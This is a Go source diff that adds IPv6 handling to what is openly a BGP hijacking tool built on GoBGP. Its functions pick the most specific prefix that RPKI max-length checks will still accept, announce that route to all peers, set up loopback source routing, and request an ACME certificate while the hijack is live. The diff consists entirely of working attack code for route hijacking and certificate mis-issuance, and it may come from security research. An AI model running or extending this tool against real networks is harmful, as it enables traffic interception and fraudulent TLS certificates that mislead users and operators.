@@ -40,7 +40,8 @@ type Config struct {
 	Communities                     []string `json:"communities"`                     // List of communities (standard or large)
 	Time                            int      `json:"time"`                            // Time in seconds to wait after hijacking
 	TimeBeforeGeneratingCertificate int      `json:"timeBeforeGeneratingCertificate"` // Time in seconds to wait before generating certificate
-	IphelperGateway                 string   `json:"iphelperGateway"`                 // Gateway IP for iphelper command
+	IphelperGatewayV4               string   `json:"iphelperGatewayV4"`               // IPv4 Gateway IP for iphelper command
+	IphelperGatewayV6               string   `json:"iphelperGatewayV6"`               // IPv6 Gateway IP for iphelper command
 	CADirURL                        string   `json:"caDirUrl"`                        // ACME CA directory URL
 	EABKid                          string   `json:"eabKid"`                          // External Account Binding Key ID
 	EABHmacKey                      string   `json:"eabHmacKey"`                      // External Account Binding HMAC Key
@@ -155,6 +156,12 @@ func createCommunityAttributes() ([]*anypb.Any, error) {
 }
 
 func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string, asn ...uint32) error {
+	// Parse the IP to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(prefix)
+	if parsedIP == nil {
+		return fmt.Errorf("invalid IP address: %s", prefix)
+	}
+
 	// Create NLRI
 	nlri, err := anypb.New(&api.IPAddressPrefix{
 		Prefix:    prefix,
@@ -207,11 +214,22 @@ func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, pre
 	}
 	pattrs = append(pattrs, communityAttrs...)
 
-	path := &api.Path{
-		Family: &api.Family{
+	// Set the appropriate family based on IP version
+	var family *api.Family
+	if parsedIP.To4() == nil {
+		family = &api.Family{
+			Afi:  api.Family_AFI_IP6,
+			Safi: api.Family_SAFI_UNICAST,
+		}
+	} else {
+		family = &api.Family{
 			Afi:  api.Family_AFI_IP,
 			Safi: api.Family_SAFI_UNICAST,
-		},
+		}
+	}
+
+	path := &api.Path{
+		Family: family,
 		Nlri:   nlri,
 		Pattrs: pattrs,
 	}
@@ -227,7 +245,7 @@ func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, pre
 }
 
 func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
-	// List all routes first
+	// Clear IPv4 routes
 	stream, err := client.ListPath(ctx, &api.ListPathRequest{
 		TableType: api.TableType_GLOBAL,
 		Family: &api.Family{
@@ -236,10 +254,10 @@ func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
 		},
 	})
 	if err != nil {
-		return fmt.Errorf("failed to list routes: %v", err)
+		return fmt.Errorf("failed to list IPv4 routes: %v", err)
 	}
 
-	// Process each route
+	// Process each IPv4 route
 	for {
 		response, err := stream.Recv()
 		if err != nil {
@@ -251,9 +269,38 @@ func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
 			Path: response.Destination.Paths[0],
 		})
 		if err != nil {
-			return fmt.Errorf("failed to delete route %s: %v", response.Destination.Prefix, err)
+			return fmt.Errorf("failed to delete IPv4 route %s: %v", response.Destination.Prefix, err)
 		}
-		fmt.Printf("Deleted route: %s\n", response.Destination.Prefix)
+		fmt.Printf("Deleted IPv4 route: %s\n", response.Destination.Prefix)
+	}
+
+	// Clear IPv6 routes
+	stream, err = client.ListPath(ctx, &api.ListPathRequest{
+		TableType: api.TableType_GLOBAL,
+		Family: &api.Family{
+			Afi:  api.Family_AFI_IP6,
+			Safi: api.Family_SAFI_UNICAST,
+		},
+	})
+	if err != nil {
+		return fmt.Errorf("failed to list IPv6 routes: %v", err)
+	}
+
+	// Process each IPv6 route
+	for {
+		response, err := stream.Recv()
+		if err != nil {
+			break // End of stream
+		}
+
+		// Delete each route individually
+		_, err = client.DeletePath(ctx, &api.DeletePathRequest{
+			Path: response.Destination.Paths[0],
+		})
+		if err != nil {
+			return fmt.Errorf("failed to delete IPv6 route %s: %v", response.Destination.Prefix, err)
+		}
+		fmt.Printf("Deleted IPv6 route: %s\n", response.Destination.Prefix)
 	}
 
 	fmt.Println("All routes cleared successfully")
@@ -261,37 +308,74 @@ func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
 }
 
 func determinePrefixStrategy(ip string) (uint32, uint32, error) {
-	// Check if it's an IPv4 address
+	// Parse the IP to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil {
+		return 0, 0, fmt.Errorf("invalid IP address: %s", ip)
+	}
+
+	isIPv6 := parsedIP.To4() == nil
+	// Check if it's an IPv4 or IPv6 address
 	prefixLen, asns, err := ripe.GetCurrentPrefixInfoFromRipe(ip)
 
 	var strategyAsn uint32
 	var strategyLen uint32
-	if prefixLen < 24 {
-		fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
-		// Check RPKI validation for each ASN
-		prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
-		for _, asn := range asns {
-			maxRpkiLength, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
-			if err != nil {
-				fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
-				continue
-			}
-
-			for i := prefixLen; i <= maxRpkiLength; i++ {
-				prefix := fmt.Sprintf("%s/%d", ip, i)
-				np, err := utils.NormalizePrefix(prefix)
+	if isIPv6 {
+		if prefixLen < 48 {
+			fmt.Println("Current announcement is less than 48, more specific announcement is possible to be used")
+			// Check RPKI validation for each ASN
+			prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
+			for _, asn := range asns {
+				maxRpkiLength, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
 				if err != nil {
-					log.Fatal(err)
+					fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
+					continue
 				}
-				fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
+
+				for i := prefixLen; i <= maxRpkiLength; i++ {
+					prefix := fmt.Sprintf("%s/%d", ip, i)
+					np, err := utils.NormalizePrefix(prefix)
+					if err != nil {
+						log.Fatal(err)
+					}
+					fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
+				}
+				strategyLen = maxRpkiLength
+				strategyAsn = asn
 			}
-			strategyLen = maxRpkiLength
-			strategyAsn = asn
+		} else {
+			fmt.Printf("[DEBUG] Current announcement is 48\n")
+			strategyAsn = asns[0]
+			strategyLen = prefixLen
 		}
 	} else {
-		fmt.Printf("[DEBUG] Current announcement is 24\n")
-		strategyAsn = asns[0]
-		strategyLen = prefixLen
+		if prefixLen < 24 {
+			fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
+			// Check RPKI validation for each ASN
+			prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
+			for _, asn := range asns {
+				maxRpkiLength, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
+				if err != nil {
+					fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
+					continue
+				}
+
+				for i := prefixLen; i <= maxRpkiLength; i++ {
+					prefix := fmt.Sprintf("%s/%d", ip, i)
+					np, err := utils.NormalizePrefix(prefix)
+					if err != nil {
+						log.Fatal(err)
+					}
+					fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
+				}
+				strategyLen = maxRpkiLength
+				strategyAsn = asn
+			}
+		} else {
+			fmt.Printf("[DEBUG] Current announcement is 24\n")
+			strategyAsn = asns[0]
+			strategyLen = prefixLen
+		}
 	}
 
 	return strategyLen, strategyAsn, err
@@ -302,6 +386,12 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 	// hijackRoutes(client, ctx, "192.168.1.0", false)
 	// Using a specific prefix length
 	// hijackRoutes(client, ctx, "192.168.1.0", false, 16)
+	// Parse the IP to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil {
+		return fmt.Errorf("invalid IP address: %s", ip)
+	}
+	isIPv6 := parsedIP.To4() == nil
 
 	// Get BGP neighbors
 	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
@@ -328,6 +418,24 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		if err != nil {
 			break
 		}
+
+		// Check if peer is IPv4 or IPv6
+		peerIP := net.ParseIP(peer.Peer.Conf.NeighborAddress)
+		if peerIP == nil {
+			fmt.Printf("[WARN] Skipping peer with invalid IP address: %s\n", peer.Peer.Conf.NeighborAddress)
+			continue
+		}
+		isPeerIPv6 := peerIP.To4() == nil
+
+		// Skip if IP version doesn't match peer version
+		if isIPv6 != isPeerIPv6 {
+			fmt.Printf("- Skipping %s peer %s (AS: %d) - IP version mismatch\n",
+				map[bool]string{true: "IPv6", false: "IPv4"}[isPeerIPv6],
+				peer.Peer.Conf.NeighborAddress,
+				peer.Peer.Conf.PeerAsn)
+			continue
+		}
+
 		fmt.Printf("- Neighbor: %s, AS: %d, State: %s\n",
 			peer.Peer.Conf.NeighborAddress,
 			peer.Peer.Conf.PeerAsn,
@@ -339,7 +447,8 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		}
 
 		if dryrun {
-			fmt.Printf("[DRYRUN] Would add route %s with origin %d\n",
+			fmt.Printf("[DRYRUN] Would add %s route %s with origin %d\n",
+				map[bool]string{true: "IPv6", false: "IPv4"}[isIPv6],
 				np, asn)
 			continue
 		}
@@ -350,7 +459,8 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
 
-		fmt.Printf("Route added successfully to %s (%s)\n",
+		fmt.Printf("%s route added successfully to %s (%s)\n",
+			map[bool]string{true: "IPv6", false: "IPv4"}[isIPv6],
 			peer.Peer.Conf.NeighborAddress, np)
 	}
 
@@ -537,17 +647,34 @@ func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Contex
 }
 
 func iphelper(ip string, isDelete bool) error {
+	// Parse the IP address to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil {
+		return fmt.Errorf("invalid IP address: %s", ip)
+	}
+
+	// Determine prefix length based on IP version
+	prefixLen := "32"
+	isIPv6 := parsedIP.To4() == nil
+	if isIPv6 {
+		prefixLen = "128" // IPv6 uses /128 for single addresses
+	}
+
 	if isDelete {
-		// execute ip addr del <ip>/32 dev lo
-		cmd := exec.Command("ip", "addr", "del", ip+"/32", "dev", "lo")
+		// execute ip addr del <ip>/<prefixLen> dev lo
+		cmd := exec.Command("ip", "addr", "del", ip+"/"+prefixLen, "dev", "lo")
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 		if err := cmd.Run(); err != nil {
 			return fmt.Errorf("failed to execute ip addr del: %v", err)
 		}
 
-		// execute ip rule del from <ip>/32 table 87
-		cmd = exec.Command("ip", "rule", "del", "from", ip+"/32", "table", "87")
+		// execute ip rule del from <ip>/<prefixLen> table 87
+		ruleCmd := []string{"rule", "del", "from", ip + "/" + prefixLen, "table", "87"}
+		if isIPv6 {
+			ruleCmd = append([]string{"-6"}, ruleCmd...)
+		}
+		cmd = exec.Command("ip", ruleCmd...)
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 		if err := cmd.Run(); err != nil {
@@ -555,7 +682,11 @@ func iphelper(ip string, isDelete bool) error {
 		}
 
 		// execute ip route flush table 87
-		cmd = exec.Command("ip", "route", "flush", "table", "87")
+		routeCmd := []string{"route", "flush", "table", "87"}
+		if isIPv6 {
+			routeCmd = append([]string{"-6"}, routeCmd...)
+		}
+		cmd = exec.Command("ip", routeCmd...)
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 		if err := cmd.Run(); err != nil {
@@ -566,9 +697,23 @@ func iphelper(ip string, isDelete bool) error {
 		return nil
 	}
 
-	// Get the gateway from config
-	if config.IphelperGateway == "" {
-		return fmt.Errorf("IphelperGateway must be specified in config.json")
+	// Get the appropriate gateway from config based on IP version
+	var gatewayIP string
+	if isIPv6 {
+		if config.IphelperGatewayV6 == "" {
+			return fmt.Errorf("IphelperGatewayV6 must be specified in config.json for IPv6 addresses")
+		}
+		gatewayIP = config.IphelperGatewayV6
+	} else {
+		if config.IphelperGatewayV4 == "" {
+			return fmt.Errorf("IphelperGatewayV4 must be specified in config.json for IPv4 addresses")
+		}
+		gatewayIP = config.IphelperGatewayV4
+	}
+
+	// Validate gateway IP format
+	if net.ParseIP(gatewayIP) == nil {
+		return fmt.Errorf("invalid gateway IP address: %s", gatewayIP)
 	}
 
 	// Check if IP is already assigned to lo interface
@@ -579,8 +724,8 @@ func iphelper(ip string, isDelete bool) error {
 	}
 
 	// Only add the IP if it's not already assigned
-	if !strings.Contains(string(output), ip+"/32") {
-		cmd = exec.Command("ip", "addr", "add", ip+"/32", "dev", "lo")
+	if !strings.Contains(string(output), ip+"/"+prefixLen) {
+		cmd = exec.Command("ip", "addr", "add", ip+"/"+prefixLen, "dev", "lo")
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 		if err := cmd.Run(); err != nil {
@@ -589,7 +734,11 @@ func iphelper(ip string, isDelete bool) error {
 	}
 
 	// Add rule for the src IP
-	cmd = exec.Command("ip", "rule", "add", "from", ip+"/32", "table", "87")
+	ruleCmd := []string{"rule", "add", "from", ip + "/" + prefixLen, "table", "87"}
+	if isIPv6 {
+		ruleCmd = append([]string{"-6"}, ruleCmd...)
+	}
+	cmd = exec.Command("ip", ruleCmd...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	if err := cmd.Run(); err != nil {
@@ -597,10 +746,18 @@ func iphelper(ip string, isDelete bool) error {
 	}
 
 	// Check if table 87 exists and flush it if it does
-	cmd = exec.Command("ip", "route", "show", "table", "87")
+	routeCmd := []string{"route", "show", "table", "87"}
+	if isIPv6 {
+		routeCmd = append([]string{"-6"}, routeCmd...)
+	}
+	cmd = exec.Command("ip", routeCmd...)
 	if err := cmd.Run(); err == nil {
 		// Table exists, flush it
-		cmd = exec.Command("ip", "route", "flush", "table", "87")
+		flushCmd := []string{"route", "flush", "table", "87"}
+		if isIPv6 {
+			flushCmd = append([]string{"-6"}, flushCmd...)
+		}
+		cmd = exec.Command("ip", flushCmd...)
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 		if err := cmd.Run(); err != nil {
@@ -609,7 +766,11 @@ func iphelper(ip string, isDelete bool) error {
 	}
 
 	// Add default route for the src IP
-	cmd = exec.Command("ip", "route", "add", "default", "via", config.IphelperGateway, "table", "87")
+	routeCmd = []string{"route", "add", "default", "via", gatewayIP, "table", "87"}
+	if isIPv6 {
+		routeCmd = append([]string{"-6"}, routeCmd...)
+	}
+	cmd = exec.Command("ip", routeCmd...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	if err := cmd.Run(); err != nil {
